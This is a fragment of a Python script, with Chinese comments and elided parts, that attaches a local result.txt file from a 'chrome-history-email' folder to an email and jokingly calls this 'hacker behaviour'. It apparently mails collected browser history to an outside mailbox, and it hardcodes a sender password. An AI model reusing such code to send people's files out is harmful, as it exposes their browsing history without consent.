...
#连接服务器(这里大家好改成自己的！)
from_addr = "truexin1292@126.com" #发件人邮箱
password = "test1234" #发件人邮箱授权码
to_addr = "truexin@163.com" #收件人邮箱
...
# 邮件正文是MIMEText:
msg.attach(MIMEText('这是黑客行为哦哦！', 'plain', 'utf-8'))

# 添加附件就是加上一个MIMEBase，从本地读取一个txt文件:
with open('/Users/truexinology/truexin/python/chrome-history-email/result.txt', 'r') as f:
